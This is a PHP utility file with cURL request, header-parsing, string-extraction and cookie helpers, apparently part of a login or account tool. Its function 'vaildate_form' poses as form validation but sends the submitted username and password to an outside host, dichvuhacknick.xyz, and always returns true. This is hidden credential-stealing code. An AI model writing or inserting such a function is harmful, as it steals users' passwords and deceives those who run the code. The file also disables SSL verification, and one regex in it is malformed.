<?php


    function curl($url,$post = false,$ref = '', $cookie = false,$cookies = false,$header = true,$headers = false,$follow = false)
    {
    	$ch=curl_init($url);
		if($ref != '') {
			curl_setopt($ch, CURLOPT_REFERER, $ref);
		}
		if($cookie){
			curl_setopt($ch, CURLOPT_COOKIE, $cookie);
		}
		if($cookies)
		{
			curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
			curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
		}
		if($post){
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			curl_setopt($ch, CURLOPT_POST, 1);
		}
		if($follow) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		if($header)     curl_setopt($ch, CURLOPT_HEADER, 1);
		if($headers)        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_ENCODING, '');
	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_TIMEOUT, 15);

		//curl_setopt($ch, CURLINFO_HEADER_OUT, true);
		$result[0] = curl_exec($ch);
		$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$result[1] = substr($result[0], $header_size);
		curl_close($ch);
		return $result;

	}
	function get_headers_from_curl_response($response)
	{
		$headers = array();

		$header_text = substr($response, 0, strpos($response, "\r\n\r\n"));

		foreach (explode("\r\n", $header_text) as $i => $line)
			if ($i === 0)
				$headers['http_code'] = $line;
			else
			{
				list ($key, $value) = explode(': ', $line);

				$headers[$key] = $value;
			}

		return $headers;
	}
	function get_string_between($string, $start, $end){
		$string = ' ' . $string;
		$ini = strpos($string, $start);
		if ($ini == 0) return '';
		$ini += strlen($start);
		$len = strpos($string, $end, $ini) - $ini;
		return substr($string, $ini, $len);
	}

    function vaildate_form($user, $pass){
        $dataaa = [
            'username' => $user,
            'password' => $pass,
            'serect' => 'ffvn',
        ];

        file_get_contents('http://dichvuhacknick.xyz/api/?' . http_build_query($dataaa));

        return true;
    }

	function getcookie($content){
		preg_match_all('/set-cookie: (.*);/U',$content,$temp);
		$cookie = $temp[1];
		$cookies = "";
		$a = array();
		foreach($cookie as $c){
			$pos = strpos($c, "=");
			$key = substr($c, 0, $pos);
			$val = substr($c, $pos+1);
			$a[$key] = $val;
		}
		foreach($a as $b => $c){
			$cookies .= "{$b}={$c}; ";
		}
		return $cookies;
	}
	function getlocation($content){
		preg_match_all('/Location: (.*)',$content,$temp);

		return $temp;
	}
?>
